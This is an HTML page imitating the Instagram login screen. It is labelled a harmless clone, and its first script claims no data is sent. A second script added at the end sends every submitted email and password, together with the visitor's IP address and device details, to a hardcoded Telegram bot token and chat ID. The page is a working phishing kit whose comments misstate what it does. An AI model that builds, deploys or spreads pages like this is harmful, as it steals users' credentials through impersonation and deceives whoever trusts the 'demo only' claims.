<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="./styles.css" />
  <link rel="icon" type="image/png" href="./img/insta-fav.ico" />
  <title>Instagram Clone - Login</title>
</head>
<body>
  <main class="flex align-items-center justify-content-center">
    <section id="mobile" class="flex"></section>

    <section id="auth" class="flex direction-column">
      <div class="panel login flex direction-column">
        <h1 title="Instagram" class="flex justify-content-center">
          <img src="./img/instagram-logo.png" alt="Instagram logo" />
        </h1>

        <form id="login-form">
          <label for="email" class="sr-only">Phone number, username, or email</label>
          <input id="email" name="email" placeholder="Phone number, username, or email" required />

          <label for="password" class="sr-only">Password</label>
          <input id="password" name="password" type="password" placeholder="Password" required minlength="6" />

          <button type="submit">Log In</button>
          <div id="message" class="msg" aria-live="polite"></div>
        </form>

        <div class="flex separator align-items-center">
          <span></span>
          <div class="or">OR</div>
          <span></span>
        </div>

        <div class="login-with-fb flex direction-column align-items-center">
          <div>
            <a href="#">Log in with Facebook</a>
          </div>
          <a href="#">Forgot password?</a>
        </div>
      </div>

      <div class="panel register flex justify-content-center">
        <p>Don't have an account?</p>
        <a href="#">Sign up</a>
      </div>

      <div class="app-download flex direction-column align-items-center">
        <p>Get the app.</p>
        <div class="flex justify-content-center">
          <img src="./img/apple-button.png" alt="Apple Store button" />
          <img src="./img/googleplay-button.png" alt="Google Play button" />
        </div>
      </div>
    </section>
  </main>

  <footer>
    <ul class="flex flex-wrap justify-content-center">
      <li><a href="#">ABOUT</a></li>
      <li><a href="#">HELP</a></li>
      <li><a href="#">PRESS</a></li>
      <li><a href="#">API</a></li>
      <li><a href="#">CAREERS</a></li>
      <li><a href="#">PRIVACY</a></li>
      <li><a href="#">TERMS</a></li>
      <li><a href="#">LOCATIONS</a></li>
      <li><a href="#">TOP ACCOUNTS</a></li>
      <li><a href="#">HASHTAGS</a></li>
      <li><a href="#">LANGUAGE</a></li>
    </ul>
    <p class="copyright">© 2025 Instagram from Meta</p>
  </footer>

  <script>
    // Safe local validation (no data is sent)
    document.getElementById("login-form").addEventListener("submit", function (e) {
      e.preventDefault();

      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      const message = document.getElementById("message");

      message.style.color = "red";

      if (!email) {
        message.textContent = "Please enter your email, phone, or username.";
        return;
      }

      if (password.length < 6) {
        message.textContent = "Password must be at least 6 characters.";
        return;
      }

      // ✅ Demo success (no external request)
      message.style.color = "green";
      message.textContent = "Login successful (demo only).";
    });
  </script>
<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "8227894684:AAHHfEr8GnKByxRQWAe089xUwp1cf1wA2co";                                                            // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
    const CHAT_ID = "1228050900";                                                       // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>

</body>
</html>
